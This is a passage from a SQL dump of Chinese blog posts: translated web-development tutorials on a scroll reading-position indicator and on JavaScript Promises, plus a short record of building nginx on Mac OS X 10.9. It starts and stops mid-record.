class="brush:css;toolbar:false">progress&nbsp;{\r\n&nbsp;&nbsp;/*&nbsp;Positioning&nbsp;*/\r\n&nbsp;&nbsp;position:&nbsp;fixed;\r\n&nbsp;&nbsp;left:&nbsp;0;\r\n&nbsp;&nbsp;top:&nbsp;0;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Dimensions&nbsp;*/\r\n&nbsp;&nbsp;width:&nbsp;100%;\r\n&nbsp;&nbsp;height:&nbsp;5px;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Reset&nbsp;the&nbsp;appearance&nbsp;*/\r\n&nbsp;&nbsp;-webkit-appearance:&nbsp;none;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-moz-appearance:&nbsp;none;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;appearance:&nbsp;none;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Get&nbsp;rid&nbsp;of&nbsp;the&nbsp;default&nbsp;border&nbsp;in&nbsp;Firefox/Opera.&nbsp;*/\r\n&nbsp;&nbsp;border:&nbsp;none;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Progress&nbsp;bar&nbsp;container&nbsp;for&nbsp;Firefox/IE10+&nbsp;*/\r\n&nbsp;&nbsp;background-color:&nbsp;transparent;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Progress&nbsp;bar&nbsp;value&nbsp;for&nbsp;IE10+&nbsp;*/\r\n&nbsp;&nbsp;color:&nbsp;red;\r\n}</pre><p>对于Blink/Webkit/Firefox, 我们需要使用厂商指定的前缀添加到进度条样式上，这里用来给进度条添加颜色。</p><pre>progress::-webkit-progress-bar&nbsp;{\r\n&nbsp;&nbsp;background-color:&nbsp;transparent;}progress::-webkit-progress-value&nbsp;{\r\n&nbsp;&nbsp;background-color:&nbsp;red;\r\n}\r\nprogress::-moz-progress-bar&nbsp;{\r\n&nbsp;&nbsp;background-color:&nbsp;red;\r\n}</pre><h3>交互</h3><p>用javascript计算浏览器的width／height属性是非常麻烦的，同时，在不同内核的浏览器中的表现是非常可怕的。幸运的是，jquery抽象了这些复杂的操作，使得我们可以以清晰的方法去计算window和document的度量。因此，在接下来的内容中，我们将会通过jquery来处理与用户之间的交互。<br/></p><p>在开始之前，不要忘记在文档中添加jquery的类库。</p><pre class="brush:html;toolbar:false">&lt;script&nbsp;src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;&gt;&lt;/script&gt;</pre><p>我们需要用jquery去获取进度条元素的max和value属性。<br/></p><p>max－它的值是通过document的高度减去window的高度获取的页面未显示出来的部分的高度。<br/></p><pre class="brush:js;toolbar:false">var&nbsp;winHeight&nbsp;=&nbsp;$(window).height(),\r\n&nbsp;&nbsp;docHeight&nbsp;=&nbsp;$(document).height();\r\n&nbsp;&nbsp;max&nbsp;=&nbsp;docHeight&nbsp;-&nbsp;winHeight;\r\n$(progress).attr(&#39;max&#39;,&nbsp;max);</pre><p>value－刚开始，value属性的值是0（已经在标记中指出了）。然后，随着用户滚动滚动条，垂直方向文档到到窗口的高度将会增加，如果滚动条在页面的最顶部，或者是不可滚动的，偏移将会是0。<br/></p><pre class="brush:js;toolbar:false">var&nbsp;value&nbsp;=&nbsp;$(window).scrollTop();\r\n$(progress).attr(&#39;value&#39;,&nbsp;value);</pre><p style="text-indent: 0em;">提示： 代替使用$(document).height()，我们可以使用诸如section,article,或者是div放置文章的内容进行计算，这样可以获取更高的阅读位置的精确度。当我们的文章含有评论内容和页面的其它组成部分占用了页面超过50%的比例的时候，这一点是非常有用的。</p><p>现在，每一次用户滚动滚动条，我们需要重新计算value的值，并设置进度条的value属性。注意的是，max属性是不变的。<br/></p><pre class="brush:js;toolbar:false">$(document).on(&#39;scroll&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;value&nbsp;=&nbsp;$(window).scrollTop();\r\n&nbsp;&nbsp;progressBar.attr(&#39;value&#39;,&nbsp;value);\r\n});</pre><p>用户滚动的方向是不重要的，因为我们每次都会重新计算value的值（y方向的偏移）。<br/></p><p>我们的代码需要在dom载入之后执行，这一点是非常重要的，否则，过早的计算window／document的高度会产生不可预知的结果。<br/></p><pre class="brush:js;toolbar:false">$(document).on(&#39;ready&#39;,&nbsp;function()&nbsp;{&nbsp;&nbsp;\r\n&nbsp;&nbsp;var&nbsp;winHeight&nbsp;=&nbsp;$(window).height(),&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;docHeight&nbsp;=&nbsp;$(document).height(),\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;progressBar&nbsp;=&nbsp;$(&#39;progress&#39;),\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;max,&nbsp;value;\r\n\r\n&nbsp;&nbsp;/*&nbsp;Set&nbsp;the&nbsp;max&nbsp;scrollable&nbsp;area&nbsp;*/\r\n&nbsp;&nbsp;max&nbsp;=&nbsp;docHeight&nbsp;-&nbsp;winHeight;\r\n&nbsp;&nbsp;progressBar.attr(&#39;max&#39;,&nbsp;max);\r\n\r\n&nbsp;&nbsp;$(document).on(&#39;scroll&#39;,&nbsp;function(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;$(window).scrollTop();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;progressBar.attr(&#39;value&#39;,&nbsp;value);\r\n&nbsp;&nbsp;});\r\n});</pre><p>（或者是可以让这段代码在页面的底部加载，这样可以跳过使用document的ready调用。<br/></p><h3>浏览器兼容性<br/></h3><p>这需要我们建立一个能够在不同浏览器中能够拥有相同表现的阅读位置指示器，我们建立的这个阅读位置指示器能够在所有良好支持html5进度条元素的浏览器中正常工作。但是，这种支持仅在firefox16+，opera 11+， chrome，safari 6＋，ie 10+的浏览器上可用。opera 11和12不支持改变进度条的颜色。因此，我们的进度条将会是默认的绿色。<br/></p><h3>边界问题</h3><p>在很多情况下，我们上述的代码可能会崩溃或者是不能够正确的指示出用户阅读的位置，让我们看看这些情况。<br/></p><h4>document高度&lt;=window高度<br/></h4><p>我们的代码假设了document的高度总是大于window的高度，但是，实际情况并不总是这样的。幸运的是，浏览器会帮助我们处理这种情况，当document的高度比window的高度小的时候，浏览器会返回window的高度。因此，docHeight和winHeight是相同的。<br/></p><pre class="brush:js;toolbar:false">max&nbsp;=&nbsp;docHeight&nbsp;-&nbsp;winHeight;&nbsp;//&nbsp;equal&nbsp;to&nbsp;zero.</pre><p>这会让进度条的max和value属性都是0。<br/></p><pre class="brush:html;toolbar:false">&lt;progress&nbsp;max=&quot;0&quot;&nbsp;value=&quot;0&quot;&gt;&lt;/progress&gt;</pre><p>因此，我们的进度条仍然是空的，而且我们的背景是透明的，这样页面中就不会出现进度条。这产生一种感觉就是当用户的视点能够充满整个页面的时候，我们没有必要再添加一个指示器了。</p><p>而且，因为文档的高度不会超过window的高度，所以滚动事件也是不会被触发的。因此，不需要做任何处理，我们的代码再处理这个边界问题的时候是足够健壮的。</p><h4>用户改变window的尺寸<br/></h4><p>当用户改变window的尺寸的时候，window和document的高度将会发生改变。这意味着我们必须要重新计算max和value属性以反映出指示器当前正确的位置。我们将会通过resize事件处理器重新计算正确的位置。<br/></p><pre class="brush:js;toolbar:false">$(window).on(&#39;resize&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;winHeight&nbsp;=&nbsp;$(window).height(),\r\n&nbsp;&nbsp;docHeight&nbsp;=&nbsp;$(document).height();\r\n\r\n&nbsp;&nbsp;max&nbsp;=&nbsp;docHeight&nbsp;-&nbsp;winHeight;\r\n&nbsp;&nbsp;progressBar.attr(&#39;max&#39;,&nbsp;max);\r\n\r\n&nbsp;&nbsp;value&nbsp;=&nbsp;&nbsp;$(window).scrollTop();\r\n&nbsp;&nbsp;progressBar.attr(&#39;value&#39;,&nbsp;value);\r\n});</pre><h4>javascript被禁用<br/></h4><p>当javascript被禁用的时候，我们的进度条将会有一个最大值为1，当前默认值为0。<br/></p><pre class="brush:html;toolbar:false">&lt;progress&nbsp;max=&quot;1&quot;&nbsp;value=&quot;0&quot;&gt;&lt;/progress&gt;</pre><p>这意味着我们的进度条将会依旧是空的，而且不会影响到页面的其它部分。这样做是很好的，因为页面中没有指示器对于读者来说并不是一个很大的缺失。</p><h4>旧的浏览器兼容<br/></h4><p>旧的不支持html5的进度条元素的浏览器将会忽略掉progress标记。然而，对于一些站点来说，提供始终如一的体验是非常重要的（该方案略，详见原文）。<br/></p><h3>性能<br/></h3><p>通常，给滚动事件添加事件处理器被认为是非常不好的实践，因为每次滚动的时候，浏览器都会试图去重绘出现的内容。在我们的例子中，dom的结构和样式是比较简单的，在页面滚动的时候不会有任何明显会注意到的延迟或者是滞后。然而，当我们放大这里，在我们的拥有复杂的dom结构的站点中实现的时候，滚动的体验将会是产生很多性能的缺失。<br/></p><p>如果滚动性能成为了你面临的一个难以客服的大问题的话，你应该尽可能避免这个特性的使用或者尝试优化代码以避免不必要的重绘。</p><h3>造成的困惑</h3><p>我不是一个UX专家，但是在一些情况下，我们的指示器的位置和外观可能会是模棱两可的并且会误导用户。ajax驱动的站点比如Medium,Youtube等，使用相似的进度条指示下一个页面载入的进度。Chrome移动浏览器本地使用蓝色的进度条作为页面加载进度。现在，如果你在框架上添加一个进度指示器，我保证肯定有很多人需要花费很长时间去理解这个顶部的指示器是有什么作用的。<br/></p><p>你必须权衡这个是否对你的用户是有好处的。<br/></p><p><br/></p><p>优点：</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>语义准确<br/></p></li><li><p>没有引入书math库或者是复杂的计算</p></li><li><p>最小化必要的标记</p></li><li><p>无缝的兼容不支持html5进度条的浏览器</p></li><li><p>无缝的兼容禁用javascript的浏览器</p></li></ol><p>缺点：</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>跨浏览器样式是复杂的</p></li><li><p>老浏览器的兼容性依赖于传统的div/span(s)标记技术去实现</p></li><li><p>性能影响（复杂的dom结构情况下）</p></li><li><p>与页面加载进度的进度条容易混淆，让用户很难理解<br/></p></li></ol><p><br/></p><p>［原文： http://css-tricks.com/reading-position-indicator/］</p>', '近期我发现很多网站增加了一种能够显示出当前阅读位置的指示器（你阅读了多少依赖于你在这篇文章上向下拉动滚动条拉动了多少）。通常，这种指示器被用在博客的文章或者是长表单上，用于帮助阅读着了解他们还有多少就能完成这篇文章或者表单。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/cb3ac43ff9cbdf47da40cb561865535f.jpg', 'mylxsw', '翻译', 1, 0, 1399735287, 1399737260, 0, 'html'),
(349, 'Javascript Promises又回来了（一）', '<p>女士们，先生们，准备好迎接web开发历史上这一关键的时刻。。。</p><p>［开始鼓掌］<br/></p><p>Javascript已经本地支持Promises了！</p><p>［烟花爆炸开，光辉的一页开始展开，观众们欢呼着］</p><p>这里，你属于下面这些类别：<br/></p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p>人们在你的周围欢呼，但是你并不知道他们为什么欢呼。可能你根本不知道“promise”是什么，你耸耸肩，这光辉的一页都压在了你的肩上。如果是这样的话，不要担心，我花费了很长时间来弄明白为什么我要在乎这个东西。你可能希望从这里开始。</p></li><li><p>你吸了一口气，这是关于时间的吗？你已经使用了一些Promise的东西，但是因为他们所有的实现都有着不同的API让你感到困惑。那一个版本是Javascript本地采用的版本呢？你可能希望从这里开始。</p></li><li><p>你已经知道这是什么了，你对那些把这个当作新事物的，心情激动的人感到好笑。花一点时间来享受你的优势吧，然后直接到API部分。</p></li></ul><h3>大家都大惊小怪什么？<br/></h3><p>Javascript是单线程的，这意味着两个脚本不可以同时运行，它们必须一个接着一个的运行。在浏览器中，javascript与许多其它东西共享这同一个线程，这些东西在不同的浏览器中是各不相同的，但是通常情况下javascript的绘制，更新样式表和处理用户的动作（例如文本高亮和表单交互控制）都是在同一个队列中的。这些活动中的任何一个都会延迟其它的活动。<br/></p><p>作为一个人类，你是多线程的。你可以多根手指活动，你可以开车的同时和别人进行交流，我们唯一需要处理的能够阻拦你的是打喷嚏，打喷嚏的时候所有的活动都会在你打喷嚏的过程中暂停。这是相当令人讨厌的，尤其是在你正在开车并且和别人保持一个通话的时候。你不会想写一些像打喷嚏的代码。<br/></p><p>你可能会使用事件和回调去避开这个，下面是事件：</p><pre class="brush:js;toolbar:false">var&nbsp;img1&nbsp;=&nbsp;document.querySelector(&#39;.img-1&#39;);\r\n\r\nimg1.addEventListener(&#39;load&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;woo&nbsp;yey&nbsp;image&nbsp;loaded\r\n});\r\n\r\nimg1.addEventListener(&#39;error&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;argh&nbsp;everything&#39;s&nbsp;broken\r\n});</pre><p>这些代码根本就不会堵塞。我们获取图片元素，添加了一系列的listener，然后javascript就会停止执行，直到其中一个listener被调用。<br/></p><p>不幸的事，在上面的例子中，可能事件发生在我们开始监听它们之前，所以我们需要使用图片的“complete”属性来解决它。</p><pre class="brush:js;toolbar:false">var&nbsp;img1&nbsp;=&nbsp;document.querySelector(&#39;.img-1&#39;);\r\n\r\nfunction&nbsp;loaded()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;woo&nbsp;yey&nbsp;image&nbsp;loaded\r\n}\r\n\r\nif&nbsp;(img1.complete)&nbsp;{\r\n&nbsp;&nbsp;loaded();\r\n}\r\nelse&nbsp;{\r\n&nbsp;&nbsp;img1.addEventListener(&#39;load&#39;,&nbsp;loaded);\r\n}\r\n\r\nimg1.addEventListener(&#39;error&#39;,&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;argh&nbsp;everything&#39;s&nbsp;broken\r\n});</pre><p>在我们获取监听它的机会之前，这不会错误的捕获图片。但是不幸的是，Dom并没有给我们提供方法去做这些。而且，这只是载入一张图片，如果我们需要知道一系列的图片是否被载入了的话，事情将会变得更加复杂。<br/></p><h3>事件并不总是最好的办法<br/></h3><p>事件比较适用与在同一个对象上可以多次发生－按键，触摸操作等。有了这些事件，你并不需要真的去关心在附加监听器之前会发生什么。但是对于异步的success／failure，理想情况下你可能希望像下面这样：</p><pre class="brush:js;toolbar:false">img1.callThisIfLoadedOrWhenLoaded(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;loaded\r\n}).orIfFailedCallThis(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;failed\r\n});\r\n\r\n//&nbsp;and…\r\nwhenAllTheseHaveLoaded([img1,&nbsp;img2]).callThis(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;all&nbsp;loaded\r\n}).orIfSomeFailedCallThis(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;one&nbsp;or&nbsp;more&nbsp;failed\r\n});</pre><p>这就是Promise要做的事情，但是有了一个更好的名字而已。如果html元素有一个ready方法能够返回promise的话，我们可以这样做：<br/></p><pre class="brush:js;toolbar:false">img1.ready().then(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;loaded\r\n},&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;failed\r\n});\r\n\r\n//&nbsp;and…\r\nPromise.all([img1.ready(),&nbsp;img2.ready()]).then(function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;all&nbsp;loaded\r\n},&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;one&nbsp;or&nbsp;more&nbsp;failed\r\n});</pre><p>从最基本的情况看来，promise有点像是事件监听器除了以下几点：<br/></p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p>一个promise只可以success或者是failure一次，它不能够成功或者失败两次，也不可以从success到failure。</p></li><li><p>如果一个promise已经成功或者是失败了，然后你在之后添加一个success或者failure回调，正确的回调将会被调用，尽管事件在之前已经发生了。</p></li></ul><p>这对异步操作的成功或者失败是极其有用的，因为你对事情什么时候会发生并不感兴趣，而对事情发生之后的结果更加感兴趣。<br/></p><h3>Promise术语</h3><p class="p1"><span class="s1"><a href="https://twitter.com/domenic">Domenic Denicola</a>阅读了本文的初稿并且给我对于术语的解释部分的评分是F。他让我放学后留下，强迫我抄写“</span></p><p class="p1">States and Fates”一百遍，并且给我的父母写了一封信对我表示担忧。尽管如此，我仍然对于很多术语会混淆，这里是一些最基本的：</p><p class="p1">一个promise可以是：<br/></p><p class="p1">fulfilled － 这个动作与promise执行成功有关<br/></p><p class="p1">rejected － 这个动作与promise执行失败有关<br/></p><p class="p1">pending － 没有fulfilled或者是rejected<br/></p><p class="p1">settled － 已经被fulfilled或者是rejected<br/></p><p class="p1">规范中也使用术语thenable描述对象是否是可以promise的，这种情况下，对象会有一个then方法。这个术语让我想起英格兰足球教练<a href="http://en.wikipedia.org/wiki/Terry_Venables">Terry Venables</a>&nbsp;，所以我将会尽可能少的用它。</p><h3>Javascript有Promise了！<br/></h3><p class="p1">Promise已经应用在一系列的类库中了，例如：</p><ul class="ul1 list-paddingleft-2"><li><p><a href="https://github.com/kriskowal/q"><span class="s1">Q</span></a></p></li><li><p><a href="https://github.com/cujojs/when"><span class="s1">when</span></a></p></li><li><p><a href="http://msdn.microsoft.com/en-us/library/windows/apps/br211867.aspx"><span class="s1">WinJS</span></a></p></li><li><p><a href="https://github.com/tildeio/rsvp.js"><span class="s1">RSVP.js</span></a></p></li></ul><p class="p1">上述的和javascript的promise都遵循着同一个标准－<a href="https://github.com/promises-aplus/promises-spec">Promises/A+</a>&nbsp;， 如果你是一个jQuery用户的话，也有类似的东西叫做<a href="http://api.jquery.com/category/deferred-object/">Deferreds</a>，然而，Deferreds与Promises/A+是不兼容的，这使得它们有一些微妙的不同并且很少被使用，请知悉。jQuery也有一个Promise类型，但这只是Deferreds的一个子集。</p><p class="p1">尽管promise的实现都遵循了一个标准的行为，但是它们的API是不同的。Javascript promise的API更像是RSVP.js。下面是如何创建一个Promise：</p><pre class="brush:js;toolbar:false">var&nbsp;promise&nbsp;=&nbsp;new&nbsp;Promise(function(resolve,&nbsp;reject)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;do&nbsp;a&nbsp;thing,&nbsp;possibly&nbsp;async,&nbsp;then…\r\n\r\n&nbsp;&nbsp;if&nbsp;(/*&nbsp;everything&nbsp;turned&nbsp;out&nbsp;fine&nbsp;*/)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;resolve(&quot;Stuff&nbsp;worked!&quot;);\r\n&nbsp;&nbsp;}\r\n&nbsp;&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;reject(Error(&quot;It&nbsp;broke&quot;));\r\n&nbsp;&nbsp;}\r\n});</pre><p class="p1">这个promise的构造函数需要一个参数，一个有着两个参数（resolve和reject）的回调函数。在回调函数中做一些操作，可能是异步的，然后如果每件事情都能够正常运行，调用resolve，否则调用reject。<br/></p><p class="p1">就行throw在原始的旧的javascript中一样，Error作为参数是一个惯例，但是并不是必须的。适用Error对象的好处是它可以捕获错误堆栈信息，让调试工具更加方便。<br/></p><p class="p1">下面是你如何适用这个Promise：</p><pre class="brush:js;toolbar:false">promise.then(function(result)&nbsp;{\r\n&nbsp;&nbsp;console.log(result);&nbsp;//&nbsp;&quot;Stuff&nbsp;worked!&quot;\r\n},&nbsp;function(err)&nbsp;{\r\n&nbsp;&nbsp;console.log(err);&nbsp;//&nbsp;Error:&nbsp;&quot;It&nbsp;broke&quot;\r\n});</pre><p class="p1">“then”需要两个参数，一个是成功的时候的回调，另一个是失败时候的回调。这两个都是可选的，你可以仅仅添加一个成功或者是失败的回调。<br/></p><p class="p1">javascript的promise开始时被作为dom的一个特性，重新命名为“Promises”，最终被移动到javascript中。让它在javascript中而不是在dom中的好处是它可以在非浏览器环境中使用了，例如Node.js（是否是它将其作为其核心API是另外一回事）。<br/></p><p class="p1">尽管它是一个javascript的特性，DOM并不会担心使用它。事实上，所有新的使用异步success／failure方法的DOM API都将使用promises。这已经在<span class="s1"><a href="https://dvcs.w3.org/hg/quota/raw-file/tip/Overview.html#idl-def-StorageQuota">Quota Management</a></span><span class="s2">, <a href="http://dev.w3.org/csswg/css-font-loading/#font-face-set-ready"><span class="s3">Font Load Events</span></a>,<a href="https://github.com/slightlyoff/ServiceWorker/blob/cf459d473ae09f6994e8539113d277cbd2bce939/service_worker.ts#L17"><span class="s3"> ServiceWorker</span></a>, <a href="http://webaudio.github.io/web-midi-api/#widl-Navigator-requestMIDIAccess-Promise-MIDIOptions-options"><span class="s3">Web MIDI</span></a>, <span class="s3"><a href="https://github.com/whatwg/streams#basereadablestream">Streams</a></span></span>等使用了。</p><h3>浏览器支持和ployfill<br/></h3><p class="p1">今天，在浏览器中已经有一些promises的实现了。<br/></p><p class="p1">在Chrome32和Opera19中，默认情况下promises是开启的。如果你是firefox派别的话，使用它的最后版本，也是提供了部分支持的。<br/></p><p class="p1">让缺乏对promise支持的浏览器实现与规范的兼容，或者是添加promises到其它浏览器或者是Node.js中，使用<span class="s1"><a href="https://github.com/jakearchibald/ES6-Promises#readme">the polyfill</a></span> (压缩后2k)。</p><h3>与其它类库的兼容<br/></h3><p class="p1">javascript的promises的API将会对任何东西都加一个then方法让其能够像是promises的，所以如果你使用一个返回一个Q promise的类库的话，这是很好的，他将会与现有的javascript promises玩的很好。尽管我已经提到过，jQuery的Deferreds是非常没有用的，幸运的是，你可以转换它们为标准的promises，这是非常值得尽快去做的。</p><pre class="brush:js;toolbar:false">var&nbsp;jsPromise&nbsp;=&nbsp;Promise.resolve($.ajax(&#39;/whatever.json&#39;));</pre><p class="p1">这里，jQuery的$.ajax返回一个Deferred。它有一个then方法，Promise.resolve可以将它转换为一个javascript的promise。然而，有时候deferreds传递多个参数给它的回调函数，例如：<br/></p><pre class="brush:js;toolbar:false">var&nbsp;jqDeferred&nbsp;=&nbsp;$.ajax(&#39;/whatever.json&#39;);\r\n\r\njqDeferred.then(function(response,&nbsp;statusText,&nbsp;xhrObj)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;...\r\n},&nbsp;function(xhrObj,&nbsp;textStatus,&nbsp;err)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;...\r\n});</pre><p class="p1">但是jsPromise将会忽略除第一个参数外的其他参数。<br/></p><pre class="brush:js;toolbar:false">jsPromise.then(function(response)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;...\r\n},&nbsp;function(xhrObj)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;...\r\n});</pre><p class="p1">希望这就是你通常所需要的，或者至少给了你可以访问你想要的内容的能力。需要注意的是，jquery的这种转换并不能够支持传递一个Error对象到rejection中。</p><p class="p1"><br/></p><p style="text-indent: 2em;">未完待续...</p><p class="p1"><br/></p><p class="p1">［原文：http://www.html5rocks.com/en/tutorials/es6/promises/］<br/></p>', 'Javascript是单线程的，这意味着两个脚本不可以同时运行，它们必须一个接着一个的运行。在浏览器中，javascript与许多其它东西共享这同一个线程，这些东西在不同的浏览器中是各不相同的，但是通常情况下javascript的绘制，更新样式表和处理用户的动作（例如文本高亮和表单交互控制）都是在同一个队列中的。这些活动中的任何一个都会延迟其它的活动。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/50344cfbffc0254317e2f07f6e7c3177.jpg', 'mylxsw', '翻译', 1, 0, 1399891536, 1399891704, 0, 'html'),
(350, 'Mac OS X 10.9安装Nginx', '<p>本文记录了如何在Mac OS X 10.9下如何安装Nginx服务器，这里只记录过程。</p><p>首先需要安装pcre，这里安装当前最新版本（8.35）：</p><pre class="brush:bash;toolbar:false">localhost:pcre-8.35&nbsp;mylxsw$&nbsp;sudo&nbsp;./configure&nbsp;--prefix=/usr/local\r\nlocalhost:pcre-8.35&nbsp;mylxsw$&nbsp;sudo&nbsp;make\r\nlocalhost:pcre-8.35&nbsp;mylxsw$&nbsp;sudo&nbsp;make&nbsp;install</pre><p>接下来安装nginx，当前版本为1.7.0，如下：</p><pre class="brush:bash;toolbar:false">localhost:nginx-1.7.0&nbsp;mylxsw$&nbsp;sudo&nbsp;./configure&nbsp;--with-cc-opt=&quot;-Wno-deprecated-declarations&quot;\r\nlocalhost:nginx-1.7.0&nbsp;mylxsw$&nbsp;sudo&nbsp;make\r\nlocalhost:nginx-1.7.0&nbsp;mylxsw$&nbsp;sudo&nbsp;make&nbsp;install\r\nlocalhost:nginx-1.7.0&nbsp;mylxsw$&nbsp;sudo&nbsp;ln&nbsp;-s&nbsp;/usr/local/nginx/sbin/nginx&nbsp;/usr/local/bin/nginx</pre><p><br/></p><p>如果没有make的话，先到应用商店安装xcode,安装之后就可以了。<br/></p><p><br/></p><p>[参考：http://www.kankanews.com/ICkengine/archives/130451.shtml］</p>', '本文记录了如何在Mac OS X 10.9下如何安装Nginx服务器，这里只记录过程。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/fbe0152fcd7c943f85ae39db92db96d9.png', 'mylxsw', '原创整理', 1, 0, 1400254166, NULL, NULL, 'html'),
(352, 'Javascript Promises又回来了（二）', '<h3>让复杂的异步代码更容易<br/></h3><p>好，让我们写一些代码，我们想要做下面的事情：<br/></p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>开始一个旋转的指针以指示载入中</p></li><li><p>获取一个故事的json数据，包含了每一章节的标题，链接地址</p></li><li><p>把标题添加到页面中</p></li><li><p>获取每一章节内容</p></li><li><p>把获取到故事内容添加到页面中</p></li><li><p>停止载入中指针显示</p></li></ol><p>同时需要告诉用户载入过程中是否出现了一些错误，我们需要在出现错误的时候也停止旋转指针，否则的话，它可能会令人感到迷惑或者是会让那个ui界面崩溃。<br/></p><p>当然，你肯定不会用javascript去加载一个故事，直接使用html会更加快速，但是，这个模式在处理API调用时时非常常见的：各种数据获取，然后在获取完成后做一些后续处理。</p><p>要开始实现这些，让我们从从网络中获取数据开始处理吧。</p><h3>Promisifying XMLHttpRequest</h3><p>如果向后兼容可行的话，旧的API将会被更新以使用promises。XMLHttpRequest就是一个主要的候选者，同时，我们先写一些简单的函数来发送一个GET请求：<br/></p><pre class="brush:js;toolbar:false">function&nbsp;get(url)&nbsp;{\r\n&nbsp;&nbsp;//&nbsp;Return&nbsp;a&nbsp;new&nbsp;promise.\r\n&nbsp;&nbsp;return&nbsp;new&nbsp;Promise(function(resolve,&nbsp;reject)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Do&nbsp;the&nbsp;usual&nbsp;XHR&nbsp;stuff\r\n&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;req&nbsp;=&nbsp;new&nbsp;XMLHttpRequest();\r\n&nbsp;&nbsp;&nbsp;&nbsp;req.open(&#39;GET&#39;,&nbsp;url);\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;req.onload&nbsp;=&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;This&nbsp;is&nbsp;called&nbsp;even&nbsp;on&nbsp;404&nbsp;etc\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;so&nbsp;check&nbsp;the&nbsp;status\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(req.status&nbsp;==&nbsp;200)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Resolve&nbsp;the&nbsp;promise&nbsp;with&nbsp;the&nbsp;response&nbsp;text\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resolve(req.response);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Otherwise&nbsp;reject&nbsp;with&nbsp;the&nbsp;status&nbsp;text\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;which&nbsp;will&nbsp;hopefully&nbsp;be&nbsp;a&nbsp;meaningful&nbsp;error\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reject(Error(req.statusText));\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;};\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Handle&nbsp;network&nbsp;errors\r\n&nbsp;&nbsp;&nbsp;&nbsp;req.onerror&nbsp;=&nbsp;function()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reject(Error(&quot;Network&nbsp;Error&quot;));\r\n&nbsp;&nbsp;&nbsp;&nbsp;};\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Make&nbsp;the&nbsp;request\r\n&nbsp;&nbsp;&nbsp;&nbsp;req.send();\r\n&nbsp;&nbsp;});\r\n}</pre><p>现在，让我们使用它：<br/></p><pre 